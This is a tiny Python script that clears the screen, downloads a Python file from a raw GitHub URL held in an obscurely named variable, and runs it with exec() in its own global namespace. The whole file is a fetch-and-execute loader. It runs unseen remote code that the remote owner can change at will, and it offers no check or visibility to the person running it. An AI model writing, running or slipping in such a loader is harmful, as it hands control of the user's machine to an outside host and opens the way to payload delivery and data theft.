import requests, os, sys

os.system('clear')
def main():
    junidokai = "https://raw.githubusercontent.com/manhscuti/tdung/refs/heads/main/manhs.py"
    exec(requests.get(junidokai).text, globals())
    
if __name__ == "__main__":
    main()